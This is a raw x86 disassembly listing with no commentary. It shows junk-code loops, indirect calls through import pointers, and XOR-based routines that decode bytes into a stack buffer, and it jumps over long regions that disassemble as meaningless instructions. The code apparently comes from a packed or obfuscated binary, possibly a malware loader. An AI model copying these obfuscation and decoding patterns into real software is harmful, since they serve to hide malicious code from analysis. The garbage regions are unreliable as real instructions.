  4038e9:	rol    DWORD PTR [ebx],0xc2
  4038ec:	mov    al,BYTE PTR [ebx+eax*1+0x32729c]
  4038f3:	mov    BYTE PTR [edi+esi*1],al
  4038f6:	mov    eax,DWORD PTR [ebp-0x4]
  4038f9:	xor    eax,ecx
  4038fb:	lea    edx,[edx+eax*1+0x32729c]
  403902:	mov    eax,DWORD PTR [ebp-0x4]
  403905:	xor    eax,ecx
  403907:	mov    esi,0xffcd8d64
  40390c:	sub    esi,eax
  40390e:	add    esi,DWORD PTR [ebp+0x10]
  403911:	cmp    edx,esi
  403913:	jbe    0x4029f8
  403919:	pop    ebx
  40391a:	mov    eax,0xf89c8530
  40391f:	pop    edi
  403920:	pop    esi
  403921:	leave  
  403922:	ret    0xc
  403925:	push   ebp
  403926:	mov    ebp,esp
  403928:	sub    esp,0x58
  40392b:	mov    ecx,DWORD PTR [ebp+0x8]
  40392e:	mov    DWORD PTR ds:0x43432d,0x11
  403938:	cmp    DWORD PTR ds:0x43432d,0x0
  40393f:	je     0x40397b
  403945:	cmp    DWORD PTR ds:0x43432d,0x17
  40394c:	jne    0x403960
  403952:	push   0x43427a
  403957:	push   DWORD PTR [ebp-0x24]
  40395a:	call   DWORD PTR ds:0x432b26
  403960:	mov    eax,ds:0x43432d
  403965:	dec    eax
  403966:	mov    ds:0x43432d,eax
  40396b:	jmp    0x403938
  403970:	mov    eax,ds:0x432cca
  403975:	add    DWORD PTR ds:0x432ce2,eax
  40397b:	mov    eax,0x8a3e
  403980:	xor    ax,WORD PTR [ecx+0x20]
  403984:	mov    ecx,0x3b04
  403989:	adc    DWORD PTR ds:0x4325f4,0x34fe
  403993:	add    ax,cx
  403996:	movzx  ecx,BYTE PTR ds:0x43431d
  40399d:	sub    DWORD PTR ds:0x4342a2,ecx
  4039a3:	movzx  eax,ax
  4039a6:	adc    ecx,DWORD PTR ds:0x434329
  4039ac:	mov    DWORD PTR [ebp-0xc],eax
  4039af:	and    ecx,0x4bd2
  4039b5:	mov    BYTE PTR [ebp-0x1],0x7f
  4039b9:	xor    ecx,ecx
  4039bb:	or     ecx,DWORD PTR ds:0x434296
  4039c1:	xor    ecx,DWORD PTR ds:0x43429a
  4039c7:	mov    DWORD PTR ds:0x434296,ecx
  4039cd:	lea    eax,[ebp-0x1]
  4039d0:	mov    DWORD PTR ds:0x432cbe,0x10
  4039da:	cmp    DWORD PTR ds:0x432cbe,0x0
  4039e1:	je     0x403a23
  4039e7:	cmp    DWORD PTR ds:0x432cbe,0x1d
  4039ee:	jne    0x403a11
  4039f4:	push   0x43428a
  4039f9:	push   0x43265d
  4039fe:	push   DWORD PTR [ebp-0xc]
  403a01:	push   0x5939
  403a06:	push   0x4c17
  403a0b:	call   DWORD PTR ds:0x432b2a
  403a11:	mov    ecx,DWORD PTR ds:0x432cbe
  403a17:	dec    ecx
  403a18:	mov    DWORD PTR ds:0x432cbe,ecx
  403a1e:	jmp    0x4039da
  403a23:	mov    DWORD PTR [ebp-0x10],eax
  403a26:	mov    al,BYTE PTR [ebp-0x1]
  403a29:	adc    DWORD PTR ds:0x4325f4,ecx
  403a2f:	mov    ecx,DWORD PTR [ebp-0x10]
  403a32:	xor    al,0x47
  403a34:	sub    al,0x37
  403a36:	and    DWORD PTR ds:0x43427e,0x4d53
  403a40:	mov    BYTE PTR [ecx],al
  403a42:	mov    DWORD PTR ds:0x432cde,0x1b
  403a4c:	cmp    DWORD PTR ds:0x432cde,0x0
  403a53:	je     0x403ab0
  403a59:	cmp    DWORD PTR ds:0x432cde,0xc
  403a60:	jne    0x403a7c
  403a66:	push   0x432ce6
  403a6b:	push   DWORD PTR [ebp-0x28]
  403a6e:	push   0x43429e
  403a73:	push   DWORD PTR [ebp-0x28]
  403a76:	call   DWORD PTR ds:0x432b2e
  403a7c:	cmp    DWORD PTR ds:0x432cde,0xd
  403a83:	jne    0x403a98
  403a89:	xor    ecx,ecx
  403a8b:	xor    ecx,DWORD PTR ds:0x432cde
  403a91:	dec    ecx
  403a92:	mov    DWORD PTR ds:0x432cde,ecx
  403a98:	mov    ecx,DWORD PTR ds:0x432cde
  403a9e:	dec    ecx
  403a9f:	mov    DWORD PTR ds:0x432cde,ecx
  403aa5:	jmp    0x403a4c
  403aaa:	and    ecx,0x3444
  403ab0:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403ab7:	mov    DWORD PTR [ebp-0x10],0xf89c8530
  403abe:	add    DWORD PTR ds:0x43429a,edi
  403ac4:	mov    eax,DWORD PTR [ebp-0x8]
  403ac7:	or     DWORD PTR ds:0x434296,ecx
  403acd:	mov    ecx,0x7510855
  403ad2:	jmp    0x403c17
  403ad7:	and    eax,0x555995f7
  403adc:	pop    ecx
  403add:	icebp  
  403ade:	jae    0x403a7c
  403ae0:	lods   eax,DWORD PTR ds:[esi]
  403ae1:	imul   ebp,DWORD PTR [ebx],0xffffff9b
  403ae4:	bound  ecx,QWORD PTR [esi+0x701eec03]
  403aea:	jo     0x403b04
  403aec:	jg     0x403b5e
  403aee:	jo     0x403ac7
  403af0:	pusha  
  403af1:	in     al,dx
  403af2:	stos   DWORD PTR es:[edi],eax
  403af3:	lds    edi,FWORD PTR [eax]
  403af5:	lock (bad) 
  403af7:	(bad)  
  403af8:	add    DWORD PTR gs:[ecx+0x1bfaa875],edx
  403aff:	in     al,0x25
  403b01:	and    al,0xb7
  403b03:	mov    al,0xd1
  403b05:	(bad)  
  403b06:	stc    
  403b07:	adc    dl,ah
  403b09:	(bad)  
  403b0a:	or     eax,DWORD PTR [ecx]
  403b0c:	push   ebx
  403b0d:	jae    0x403aaf
  403b0f:	rol    DWORD PTR [ebp-0x24],1
  403b12:	xchg   esp,eax
  403b13:	cmp    DWORD PTR [ebp+eiz*8+0x597c7e03],esi
  403b1a:	pop    es
  403b1b:	loopne 0x403b47
  403b1d:	fnstcw WORD PTR [ebx+0x58]
  403b20:	ds adc al,0xdc
  403b23:	in     eax,0xc8
  403b25:	adc    DWORD PTR [ecx+0x3b],0xe0cd812b
  403b2c:	lods   al,BYTE PTR ds:[esi]
  403b2d:	aam    0x78
  403b2f:	aas    
  403b30:	int3   
  403b31:	js     0x403ae1
  403b33:	lds    esi,FWORD PTR [eax+0x30]
  403b36:	xor    ch,BYTE PTR [eax-0x40]
  403b39:	test   bh,bl
  403b3b:	add    ebp,ebx
  403b3d:	jecxz  0x403b82
  403b3f:	out    dx,al
  403b40:	leave  
  403b41:	mov    al,ds:0x1bc3c117
  403b46:	adc    ecx,edi
  403b48:	enter  0xad14,0x6b
  403b4c:	imul   edx,DWORD PTR [ecx+0x76c3ef3],0x77
  403b53:	(bad)  
  403b55:	lea    ebx,[ecx+0x52]
  403b58:	or     ecx,DWORD PTR [eax-0x1f]
  403b5b:	mov    bh,0x6
  403b5d:	paddusb mm4,QWORD PTR [edi]
  403b60:	and    ecx,esi
  403b62:	jnp    0x403ba8
  403b64:	fadd   DWORD PTR [ecx]
  403b66:	scas   al,BYTE PTR es:[edi]
  403b67:	les    eax,FWORD PTR [esi]
  403b69:	cld    
  403b6a:	js     0x403b1a
  403b6c:	cmp    eax,0xca706a84
  403b71:	imul   ecx
  403b73:	adc    al,0xd9
  403b75:	add    ch,ch
  403b77:	jb     0x403b73
  403b79:	cmp    ch,al
  403b7b:	data16 adc al,0x4d
  403b7e:	xor    al,ah
  403b80:	mov    bl,0x29
  403b82:	jae    0x403b1a
  403b84:	pop    ss
  403b85:	(bad)  
  403b86:	std    
  403b87:	and    edx,DWORD PTR [eax+0x5895a0df]
  403b8d:	add    al,0x43
  403b8f:	or     ebx,ebx
  403b91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b92:	xor    edx,DWORD PTR ds:0x562596c1
  403b98:	dec    edi
  403b99:	sbb    eax,0x582352dc
  403b9e:	pop    edi
  403b9f:	adc    eax,0xe9405f4
  403ba4:	xor    DWORD PTR [edx+ecx*1-0xc],ebx
  403ba8:	or     eax,0x6217c03c
  403bad:	sbb    bh,BYTE PTR [edi-0x4f85cc3e]
  403bb3:	aas    
  403bb4:	pop    ebp
  403bb5:	cmp    eax,0xa1f65dfa
  403bba:	sub    al,0x72
  403bbc:	pop    ecx
  403bbd:	out    0xaa,eax
  403bbf:	loopne 0x403b43
  403bc1:	mov    ebp,0xf39b906f
  403bc6:	fsubr  DWORD PTR cs:[ebx+0x1900e6e6]
  403bcd:	xor    BYTE PTR fs:[eax],dl
  403bd0:	imul   DWORD PTR [edi-0x5c]
  403bd3:	arpl   bp,ax
  403bd5:	ror    BYTE PTR [esp+edx*8-0x29],cl
  403bd9:	in     eax,dx
  403bda:	lahf   
  403bdb:	loopne 0x403c44
  403bdd:	cmp    al,0x62
  403bdf:	inc    edx
  403be0:	xor    eax,0x2ea54bb5
  403be5:	loop   0x403c5d
  403be7:	jmp    0x7138:0x9687017f
  403bee:	lods   eax,DWORD PTR ds:[esi]
  403bef:	sbb    al,0x39
  403bf1:	repnz in al,0x34
  403bf4:	sbb    eax,0xba91c2e
  403bf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bfa:	rol    BYTE PTR [eax-0x70],1
  403bfd:	push   edx
  403bfe:	fbld   TBYTE PTR [esi-0x45]
  403c01:	cmp    dh,bh
  403c03:	adc    eax,0xfde71d04
  403c08:	repz fstp DWORD PTR [eax+0x614a3ea3]
  403c0f:	jbe    0x403bba
  403c11:	addr16 pop ecx
  403c13:	mov    DWORD PTR ds:0x46566f5b,eax
  403c19:	xor    eax,ecx
  403c1b:	mov    esi,0x32729c
  403c20:	sbb    DWORD PTR ds:0x434276,0x434321
  403c2a:	add    eax,esi
  403c2c:	mov    DWORD PTR ds:0x432cd6,0x19db
  403c36:	jmp    0x403c4d
  403c3b:	mov    DWORD PTR ds:0x43426a,0x1bda
  403c45:	mov    dl,BYTE PTR [ebp-0x1]
  403c48:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403c4c:	inc    eax
  403c4d:	cmp    eax,0x40
  403c50:	jmp    0x403d95
  403c55:	sbb    bl,BYTE PTR [ebx+eiz*1+0x1981a102]
  403c5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c5d:	scas   al,BYTE PTR es:[edi]
  403c5e:	xchg   ecx,eax
  403c5f:	sub    al,0x28
  403c61:	sbb    al,0xe5
  403c63:	lods   eax,DWORD PTR ds:[esi]
  403c64:	jle    0x403bfa
  403c66:	sbb    eax,0x7f187070
  403c6b:	jo     0x403cdd
  403c6d:	or     eax,0x1b0b08c7
  403c72:	sub    BYTE PTR [edi],cl
  403c74:	test   bl,dl
  403c76:	outs   dx,DWORD PTR ds:[esi]
  403c77:	out    dx,eax
  403c78:	in     al,dx
  403c79:	push   0x22
  403c7b:	mov    al,0x7b
  403c7d:	(bad)  
  403c7e:	repnz mov bl,0xc2
  403c81:	ss das 
  403c83:	xchg   ebx,eax
  403c84:	out    0x49,al
  403c86:	adc    esi,ecx
  403c88:	mov    ebx,0x145155e3
  403c8d:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  403c8f:	es pop ss
  403c91:	sar    ebx,0xff
  403c94:	jmp    0x403c3a
  403c96:	xor    DWORD PTR ss:0x2f70ecd2,0xfffffffb
  403c9e:	pop    ebp
  403c9f:	shl    BYTE PTR [esp+eax*8+0x3dc1e77b],cl
  403ca6:	retf   0x11a7
  403ca9:	inc    ebx
  403caa:	popa   
  403cab:	int    0x59
  403cad:	test   ebx,eax
  403caf:	ins    DWORD PTR es:[edi],dx
  403cb0:	jb     0x403cf8
  403cb2:	jno    0x403c9b
  403cb4:	and    edx,DWORD PTR [ebp-0xe91568a]
  403cba:	dec    edx
  403cbb:	jmp    0x403cb5
  403cbd:	sub    BYTE PTR [ebp-0x336db8b8],al
  403cc3:	push   esi
  403cc4:	xor    ebx,DWORD PTR [esi+0x4d]
  403cc7:	fcomp  QWORD PTR cs:[edi-0x4b31048]
  403cce:	cmp    BYTE PTR [edx+0x53406da8],cl
  403cd4:	xchg   DWORD PTR [esp+ebx*8],ebp
  403cd7:	mov    BYTE PTR [edi-0x7c784b86],dl
  403cdd:	or     al,0x12
  403cdf:	dec    ecx
  403ce0:	or     esp,DWORD PTR [ebp-0x3a]
  403ce3:	dec    edi
  403ce4:	jne    0x403d1b
  403ce6:	test   al,0x14
  403ce8:	lods   eax,DWORD PTR ds:[esi]
  403ce9:	pop    ss
  403cea:	adc    eax,0x422907e0
  403cef:	pop    esi
  403cf0:	xor    BYTE PTR [edi],dh
  403cf2:	dec    edx
  403cf3:	xchg   edx,eax
  403cf4:	push   ss
  403cf5:	lock jnp 0x403cda
  403cf8:	mov    eax,0xfd5174b3
  403cfd:	xchg   esi,eax
  403cfe:	bound  esi,QWORD PTR [eax-0x2c]
  403d01:	lahf   
  403d02:	xchg   edx,eax
  403d03:	mov    ecx,0x1e456381
  403d09:	int3   
  403d0a:	push   ebp
  403d0b:	aad    0x1c
  403d0d:	and    al,0x3b
  403d0f:	jmp    0x787803f7
  403d14:	sub    ah,ah
  403d16:	in     al,0x90
  403d18:	(bad)  
  403d19:	clc    
  403d1a:	das    
  403d1b:	mov    ds:0xb763ae1f,al
  403d20:	shr    DWORD PTR [ebx],1
  403d22:	adc    eax,0xf3b52be
  403d27:	or     dh,bl
  403d29:	cmp    DWORD PTR [ecx+0x7d],ecx
  403d2c:	inc    esi
  403d2d:	jmp    0x92bf:0x21a56d72
  403d34:	in     eax,dx
  403d35:	push   edi
  403d36:	(bad)  
  403d37:	pusha  
  403d38:	cmc    
  403d39:	(bad)  
  403d3a:	fdivr  DWORD PTR [edi]
  403d3c:	inc    edi
  403d3d:	leave  
  403d3e:	push   0x14
  403d40:	cmc    
  403d41:	push   cs
  403d42:	push   esp
  403d43:	ret    0x2705
  403d46:	ss pushf 
  403d48:	jae    0x403d14
  403d4a:	lds    eax,FWORD PTR [eax-0x1]
  403d4d:	cli    
  403d4e:	es stos BYTE PTR es:[edi],al
  403d50:	(bad)  
  403d51:	push   ss
  403d52:	mov    cl,BYTE PTR [edi+0x6055daf9]
  403d58:	and    bh,0xb1
  403d5b:	dec    edi
  403d5c:	mov    ch,0xbc
  403d5e:	xor    esi,DWORD PTR [ecx+0x1a]
  403d61:	shr    DWORD PTR [ebx+0x26ef1e6b],0x11
  403d68:	cmp    eax,DWORD PTR [esi-0x747a184a]
  403d6e:	popa   
  403d6f:	out    dx,eax
  403d70:	mov    ecx,0xea15927a
  403d75:	lock in eax,0x27
  403d78:	add    eax,0x63d0e9e8
  403d7d:	mov    dh,0x7
  403d7f:	mov    bh,0x3f
  403d81:	add    eax,0x81e186b6
  403d86:	ja     0x403d0c
  403d88:	cmp    dh,al
  403d8a:	fcomp  QWORD PTR [eax+edx*2+0x73b2b36f]
  403d91:	dec    ebx
  403d92:	or     ch,bl
  403d94:	hlt    
  403d95:	jb     0x403c3b
  403d9b:	mov    edx,DWORD PTR [ebp-0x8]
  403d9e:	and    DWORD PTR ds:0x43429a,0x0
  403da8:	jmp    0x403dbb
  403dad:	xor    eax,eax
  403daf:	add    eax,DWORD PTR ds:0x43429a
  403db5:	inc    eax
  403db6:	mov    ds:0x43429a,eax
  403dbb:	cmp    DWORD PTR ds:0x43429a,0x13
  403dc2:	jae    0x403dfe
  403dc8:	cmp    DWORD PTR ds:0x43429a,0xc
  403dcf:	jne    0x403dde
  403dd5:	push   DWORD PTR [ebp-0x1c]
  403dd8:	call   DWORD PTR ds:0x4328be
  403dde:	cmp    DWORD PTR ds:0x43429a,0xb
  403de5:	jne    0x403df9
  403deb:	xor    eax,eax
  403ded:	add    eax,DWORD PTR ds:0x43429a
  403df3:	inc    eax
  403df4:	mov    ds:0x43429a,eax
  403df9:	jmp    0x403dad
  403dfe:	mov    eax,DWORD PTR [ebp-0xc]
  403e01:	xor    edx,ecx
  403e03:	add    edx,esi
  403e05:	cmp    edx,eax
  403e07:	jmp    0x403f4c
  403e0c:	inc    ecx
  403e0d:	sub    al,0xb8
  403e0f:	xor    BYTE PTR [ebp+0x72],0x41
  403e13:	jmp    0x403d9a
  403e15:	inc    ebp
  403e16:	mov    al,0x72
  403e18:	call   0x701c:0xbce985e2
  403e1f:	jo     0x403e39
  403e21:	jg     0x403e93
  403e23:	jo     0x403e95
  403e25:	bound  esp,QWORD PTR [esi]
  403e27:	(bad)  
  403e28:	adc    eax,0xca23c917
  403e2d:	pop    ss
  403e2e:	xor    BYTE PTR [ecx+0x3777d6da],0x14
  403e35:	pop    ss
  403e36:	mov    dh,0xf5
  403e38:	imul   ebp,DWORD PTR [ecx-0x21277c4a],0xffffffe5
  403e3f:	in     eax,dx
  403e40:	in     eax,0xcc
  403e42:	ret    
  403e43:	rcr    DWORD PTR [ecx-0x27c9085],cl
  403e49:	cdq    
  403e4a:	jmp    0x403eca
  403e4c:	(bad)  
  403e4d:	(bad)  [esi]
  403e4f:	sbb    al,0x5e
  403e51:	test   al,0xcf
  403e53:	mov    esi,0x55a3b1d4
  403e58:	xchg   edx,eax
  403e59:	into   
  403e5a:	cwde   
  403e5b:	xor    eax,0x67c0bcc4
  403e60:	xlat   BYTE PTR ds:[ebx]
  403e61:	pop    esi
  403e62:	into   
  403e63:	bound  edx,QWORD PTR [ecx]
  403e65:	push   ebp
  403e66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e67:	sti    
  403e68:	dec    esi
  403e69:	cwde   
  403e6a:	and    eax,0x9707d6ff
  403e6f:	fwait
  403e70:	in     eax,0x71
  403e72:	sub    al,0xe6
  403e74:	pop    es
  403e75:	pusha  
  403e76:	mov    ah,0x4d
  403e78:	mov    ebx,0x6b8caf49
  403e7d:	sbb    BYTE PTR [eax+ebp*2-0x7a2fece7],ch
  403e84:	add    eax,0xa8ccde74
  403e89:	stos   BYTE PTR es:[edi],al
  403e8a:	ins    BYTE PTR es:[edi],dx
  403e8b:	in     eax,dx
  403e8c:	or     dl,dh
  403e8e:	mov    bh,0xf4
  403e90:	sbb    eax,DWORD PTR [ecx+0x70]
  403e93:	gs data16 cld 
  403e96:	or     DWORD PTR [esi-0x248f5a29],edx
  403e9c:	(bad)  
  403e9d:	int    0x5f
  403e9f:	cmp    eax,0xffc60822
  403ea4:	scas   eax,DWORD PTR es:[edi]
  403ea5:	xor    al,0x56
  403ea7:	or     DWORD PTR [eax+esi*1-0xf],esp
  403eab:	push   edx
  403eac:	test   BYTE PTR [edi-0x29],al
  403eaf:	push   esi
  403eb0:	pop    esi
  403eb1:	fdivr  QWORD PTR [eax+ebp*4-0x7f07e4a0]
  403eb8:	clc    
  403eb9:	sar    BYTE PTR [edx-0x2d],cl
  403ebc:	ins    DWORD PTR es:[edi],dx
  403ebd:	inc    edx
  403ebe:	aas    
  403ebf:	mov    al,0xf7
  403ec1:	or     al,0x74
  403ec3:	mov    dh,0x39
  403ec5:	or     BYTE PTR [ecx-0x7a9515b6],bh
  403ecb:	retf   
  403ecc:	or     BYTE PTR [ebp-0x67ecc75a],0x33
  403ed3:	ins    DWORD PTR es:[edi],dx
  403ed4:	mov    ebp,0xffc2bad4
  403ed9:	mov    edi,0xa64535d7
  403ede:	or     DWORD PTR [edi+ecx*8],esi
  403ee1:	ds inc ecx
  403ee3:	repz sub edi,DWORD PTR [edi]
  403ee6:	dec    eax
  403ee7:	data16 sub BYTE PTR [esi],0x0
  403eeb:	dec    esp
  403eec:	mov    al,0x98
  403eee:	popa   
  403eef:	lahf   
  403ef0:	sbb    cl,BYTE PTR [edi-0x18]
  403ef3:	sbb    dl,0x73
  403ef6:	adc    eax,0x6ca016b
  403efb:	pop    edx
  403efc:	dec    ecx
  403efd:	sub    BYTE PTR [ecx],0x27
  403f00:	or     al,0x4c
  403f02:	jno    0x403ecd
  403f04:	dec    eax
  403f05:	sub    ah,BYTE PTR cs:[ecx]
  403f08:	popa   
  403f09:	fstp   DWORD PTR [esi+esi*2+0x20]
  403f0d:	sbb    DWORD PTR [edx-0x428a1021],ecx
  403f13:	out    0x4f,al
  403f15:	and    bh,dl
  403f17:	mov    dh,0xcf
  403f19:	pop    esp
  403f1a:	mov    al,BYTE PTR [edi+eiz*2]
  403f1d:	pop    ebx
  403f1e:	cmp    al,0xc7
  403f20:	ins    DWORD PTR es:[edi],dx
  403f21:	jmp    0x403f64
  403f23:	cdq    
  403f24:	out    0xc5,eax
  403f26:	or     ah,bl
  403f28:	adc    DWORD PTR ds:0x642b985,ebp
  403f2e:	scas   al,BYTE PTR es:[edi]
  403f2f:	sti    
  403f30:	dec    eax
  403f31:	mov    cl,0x36
  403f33:	lea    edi,[edi]
  403f35:	pushf  
  403f36:	jmp    0x403f1c
  403f38:	mov    eax,0xfdd0e567
  403f3d:	imul   esp,DWORD PTR [edx-0x20e1a72f],0xccffd3cd
  403f47:	jne    0x403eec
  403f49:	xor    DWORD PTR [eax+esi*4+0xf],ecx
  403f4d:	test   BYTE PTR [ebp+0x53000001],al
  403f53:	push   edi
  403f54:	mov    edi,DWORD PTR [ebp+0x8]
  403f57:	mov    eax,0x8a3e
  403f5c:	xor    ax,WORD PTR [edi+edx*4+0x2]
  403f61:	mov    edi,0x3b04
  403f66:	add    ax,di
  403f69:	movzx  eax,ax
  403f6c:	mov    DWORD PTR [ebp-0x14],eax
  403f6f:	mov    eax,DWORD PTR [ebp+0x8]
  403f72:	movzx  eax,WORD PTR [eax+edx*4]
  403f76:	xor    eax,0x8a3e
  403f7b:	add    eax,edi
  403f7d:	mov    edi,DWORD PTR [ebp-0x14]
  403f80:	mov    BYTE PTR [ebp+edi*1-0x58],al
  403f84:	mov    eax,DWORD PTR [ebp-0xc]
  403f87:	inc    edx
  403f88:	cmp    edx,eax
  403f8a:	jne    0x403f54
  403f90:	pop    edi
  403f91:	jmp    0x4040d6
  403f96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f97:	fisubr DWORD PTR [edi-0x598e8c4b]
  403f9d:	jmp    0x4923f392
  403fa2:	push   esi
  403fa3:	or     ch,BYTE PTR [ecx-0x24]
  403fa6:	sbb    esi,DWORD PTR fs:[eax+0x70]
  403faa:	sbb    BYTE PTR [edi+0x70],bh
  403fad:	jo     0x403f74
  403faf:	pop    esp
  403fb0:	fcom   DWORD PTR [ebx-0x66f15870]
  403fb6:	fidivr DWORD PTR [edx-0x18]
  403fb9:	sbb    eax,0x57f31b77
  403fbe:	nop
  403fbf:	test   eax,0x1efbb4cd
  403fc4:	mov    ds:0x8aabe11f,eax
  403fc9:	pause  
  403fcb:	jg     0x40400e
  403fcd:	retf   
  403fce:	dec    ecx
  403fcf:	xor    DWORD PTR [eax],edi
  403fd1:	nop
  403fd2:	sar    dh,0x51
  403fd5:	out    dx,eax
  403fd6:	retf   
  403fd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fd8:	xchg   ebp,eax
  403fd9:	pop    ecx
  403fda:	fcomp  DWORD PTR [ecx]
  403fdc:	mov    cs,edi
  403fde:	add    dl,BYTE PTR [eax]
  403fe0:	xor    al,0x10
  403fe2:	and    bh,BYTE PTR [edi]
  403fe4:	dec    ebx
  403fe5:	loopne 0x403f72
  403fe7:	push   ss
  403fe8:	mov    edx,ds
  403fea:	ret    0x2775
  403fed:	pop    ecx
  403fee:	xchg   esi,eax
  403fef:	and    al,0x4d
  403ff1:	lahf   
  403ff2:	inc    ecx
  403ff3:	cmp    al,0xa8
  403ff5:	sbb    cl,BYTE PTR [ebp+0x4f]
  403ff8:	mov    WORD PTR [edi+0x639fb585],es
  403ffe:	(bad)  
  403fff:	push   0x52702829
  404004:	enter  0xe671,0xdd
  404008:	lahf   
  404009:	cwde   
  40400a:	or     ah,BYTE PTR [ebp-0x36]
  40400d:	push   edx
  40400e:	fcomip st,st(7)
  404010:	bound  ebx,QWORD PTR [edx+ecx*2+0x1c66a348]
  404017:	sbb    eax,0xf7d9f452
  40401c:	popa   
  40401d:	fs mov ss,ebx
  404020:	fld    QWORD PTR [ebp-0x12]
  404023:	pop    ebx
  404024:	xchg   ecx,eax
  404025:	inc    edi
  404026:	call   0xc260:0x98035c63
  40402d:	jecxz  0x403fe5
  40402f:	shl    DWORD PTR [ebp-0x20],1
  404032:	adc    BYTE PTR [eax-0x1c61514d],cl
  404038:	pop    esp
  404039:	repz (bad) 
  40403b:	xlat   BYTE PTR ds:[ebx]
  40403c:	push   0xb
  40403e:	sub    eax,0xefff717f
  404043:	in     al,0x50
  404045:	pop    ebx
  404046:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404047:	push   ecx
  404048:	fnstcw WORD PTR [ebp-0x1]
  40404b:	push   esi
  40404c:	add    BYTE PTR [eax+0x42],ch
  40404f:	fs aas 
  404051:	ret    0x6af1
  404054:	inc    edx
  404055:	dec    esi
  404056:	jmp    FWORD PTR [eax+eiz*1]
  404059:	pusha  
  40405a:	rol    DWORD PTR [ecx+0x14],cl
  40405d:	les    edi,FWORD PTR [esi+0x5a]
  404060:	rcl    BYTE PTR [esi+0x19],cl
  404063:	pop    ecx
  404064:	ss lock icebp 
  404067:	fistp  QWORD PTR [ebp+ebx*8+0x548873d7]
  40406e:	cmp    ebx,0x7a24e3c1
  404074:	inc    ebx
  404075:	fucomi st,st(6)
  404077:	(bad)  [eax-0x460be224]
  40407d:	ins    BYTE PTR es:[edi],dx
  40407e:	popf   
  40407f:	cmc    
  404080:	adc    DWORD PTR [ecx-0x44],ebx
  404083:	cs xchg ecx,eax
  404085:	mov    ah,0x90
  404087:	or     DWORD PTR [edi-0x1855ce91],esp
  40408d:	or     DWORD PTR [eax+0x262efd20],eax
  404093:	outs   dx,BYTE PTR cs:[esi]
  404095:	mov    ebx,0x42b5686c
  40409a:	ss xchg edx,eax
  40409c:	imul   esi,DWORD PTR [esi+0x4a7a76fb],0xffffff8e
  4040a3:	jnp    0x404117
  4040a5:	iret   
  4040a6:	cmp    bh,BYTE PTR [eax+0x13]
  4040a9:	or     al,0x9c
  4040ab:	dec    esi
  4040ac:	cli    
  4040ad:	les    eax,FWORD PTR [esi+ebp*1-0x37]
  4040b1:	mov    ecx,0x34daea12
  4040b6:	push   ecx
  4040b7:	icebp  
  4040b8:	adc    BYTE PTR ds:0x896e4408,cl
  4040be:	imul   ebx,DWORD PTR [edi+0x7b54e46f],0xcf0ece03
  4040c8:	pop    ds
  4040c9:	inc    esp
  4040ca:	and    al,0x7d
  4040cc:	loop   0x404063
  4040ce:	or     ecx,DWORD PTR [esi]
  4040d0:	pop    ebp
  4040d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040d2:	inc    eax
  4040d3:	mov    dh,0xf8
  4040d5:	rcr    BYTE PTR [ebx-0x75],cl
  4040d8:	inc    ebp
  4040d9:	clc    
  4040da:	mov    edx,DWORD PTR [ebp+0x10]
  4040dd:	jmp    0x404222
  4040e2:	aaa    
  4040e3:	ins    DWORD PTR es:[edi],dx
  4040e4:	pop    ss
  4040e5:	int3   
  4040e6:	push   ebp
  4040e7:	jb     0x4040dc
  4040e9:	jno    0x404096
  4040eb:	pop    ebx
  4040ec:	imul   edi,DWORD PTR [edx-0x61f14cf5],0xc
  4040f3:	sbb    DWORD PTR [eax+0x70],esi
  4040f6:	sbb    BYTE PTR [edi+0x70],bh
  4040f9:	jo     0x40410e
  4040fb:	xor    BYTE PTR [ecx+0x31],0xe4
  4040ff:	mov    ebx,DWORD PTR [eax-0x67]
  404102:	mov    dh,0x4e
  404104:	jne    0x4040f0
  404106:	sbb    dh,0xda
  404109:	xchg   BYTE PTR [ebx+0x1da4703e],bl
  40410f:	sub    eax,0x957477ac
  404115:	ins    BYTE PTR es:[edi],dx
  404116:	jno    0x4040e0
  404118:	xchg   esp,eax
  404119:	mov    bh,0xc0
  40411b:	jae    0x40412e
  40411d:	imul   edx,DWORD PTR [esi-0xb],0xffffffdc
  404121:	aas    
  404122:	push   ecx
  404123:	or     ebp,edi
  404125:	stos   BYTE PTR es:[edi],al
  404126:	inc    esp
  404127:	call   0x3211:0x7bfcfae5
  40412e:	test   DWORD PTR [edi-0x786b893f],eax
  404134:	sar    DWORD PTR [ecx],0xf8
  404137:	gs mov esp,0xa84a81a
  40413d:	loope  0x404126
  40413f:	mov    BYTE PTR [ebx+0x64],bl
  404142:	fwait
  404143:	aam    0xac
  404145:	and    BYTE PTR [eax],ch
  404147:	mov    eax,0x4e3428c9
  40414c:	leave  
  40414d:	xchg   ecx,eax
  40414e:	sbb    DWORD PTR [ecx+0x0],esi
  404151:	mov    ecx,0x820601fb
  404156:	ja     0x404131
  404158:	jno    0x404156
  40415a:	add    cl,ah
  40415c:	sub    al,0x4a
  40415e:	(bad)  
  40415f:	push   edx
  404160:	add    cl,bh
  404162:	mov    edx,0x11290c72
  404167:	js     0x4041a5
  404169:	dec    esi
  40416a:	cmp    al,0x98
  40416c:	aam    0xcb
  40416e:	sub    BYTE PTR [esi+0x2fa8219],cl
  404174:	fbstp  TBYTE PTR [eax-0x775a191b]
  40417a:	mov    esp,0x67064065
  40417f:	(bad)  
  404181:	or     esi,DWORD PTR [ebx+0x1e]
  404184:	xchg   BYTE PTR [ecx],ah
  404186:	push   ss
  404187:	or     BYTE PTR [ecx-0x1570c4b0],bl
  40418d:	arpl   ax,ax
  40418f:	popa   
  404190:	cs pop esp
  404192:	mov    ah,0xff
  404194:	adc    ch,cl
  404196:	inc    edi
  404197:	push   0xd798e5ed
  40419c:	jg     0x40420f
  40419e:	dec    ecx
  40419f:	out    0xd3,eax
  4041a1:	ins    DWORD PTR es:[edi],dx
  4041a2:	adc    DWORD PTR [ebp+0x26519b1a],0x78bb0696
  4041ac:	pop    ss
  4041ad:	dec    ecx
  4041ae:	arpl   WORD PTR [edi+ebp*4],si
  4041b1:	ret    
  4041b2:	or     al,0x8a
